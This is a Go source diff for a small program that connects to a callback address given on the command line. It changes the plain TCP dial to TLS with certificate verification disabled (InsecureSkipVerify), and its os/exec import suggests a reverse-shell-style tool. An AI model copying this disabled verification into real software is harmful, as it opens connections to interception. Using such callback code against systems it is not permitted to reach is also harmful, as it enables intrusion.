@@ -1,9 +1,9 @@
 package main
 
 import (
+	"crypto/tls"
 	"io"
 	"log"
-	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -15,7 +15,10 @@ import (
 
 func test() error {
 	callback := os.Args[1]
-	conn, err := net.Dial("tcp", callback)
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+	conn, err := tls.Dial("tcp", callback, conf)
 	if err != nil {
 		println(err.Error())
 		os.Exit(1)
